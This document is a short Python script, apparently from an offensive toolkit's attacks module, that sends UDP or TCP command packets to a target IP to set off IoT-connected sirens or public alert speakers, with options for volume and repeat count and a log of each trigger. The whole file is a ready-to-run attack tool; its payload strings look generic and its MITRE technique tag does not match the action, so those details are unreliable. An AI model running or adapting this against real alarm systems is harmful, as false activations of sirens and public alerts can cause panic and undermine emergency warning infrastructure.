#!/usr/bin/env python3
# modules/attacks/iot_siren_trigger.py

import argparse
import json
import os
import socket
import time
from datetime import datetime

LOG_FILE = "results/siren_trigger_log.json"
MITRE_TTP = "T1583.006"

def log_trigger(ip, method, volume, repeat):
    os.makedirs("results", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps({
            "timestamp": datetime.utcnow().isoformat(),
            "target_ip": ip,
            "method": method,
            "volume": volume,
            "repeat": repeat,
            "ttp": MITRE_TTP
        }) + "\n")

def send_udp_siren(ip, port, volume, repeat):
    payload = f"ACTIVATE_ALARM;VOLUME={volume};REPEAT={repeat}".encode()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(repeat):
            sock.sendto(payload, (ip, port))
            time.sleep(0.5)
        log_trigger(ip, "udp", volume, repeat)
        print(f"[✓] UDP siren command sent to {ip}:{port}")
    except Exception as e:
        print(f"[!] UDP trigger failed: {e}")

def send_tcp_siren(ip, port, volume, repeat):
    payload = f"<ALERT><VOL>{volume}</VOL><REP>{repeat}</REP></ALERT>".encode()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.sendall(payload)
        sock.close()
        log_trigger(ip, "tcp", volume, repeat)
        print(f"[✓] TCP siren command sent to {ip}:{port}")
    except Exception as e:
        print(f"[!] TCP trigger failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Trigger IoT-connected sirens or public alert speakers")
    parser.add_argument("--ip", required=True, help="Target siren IP")
    parser.add_argument("--port", type=int, default=9999, help="Port for alert trigger")
    parser.add_argument("--volume", type=int, default=5, help="Siren volume level (1-10)")
    parser.add_argument("--repeat", type=int, default=3, help="Repeat count for broadcast")
    parser.add_argument("--protocol", choices=["udp", "tcp"], default="udp", help="Protocol to trigger siren")
    args = parser.parse_args()

    if args.protocol == "udp":
        send_udp_siren(args.ip, args.port, args.volume, args.repeat)
    else:
        send_tcp_siren(args.ip, args.port, args.volume, args.repeat)
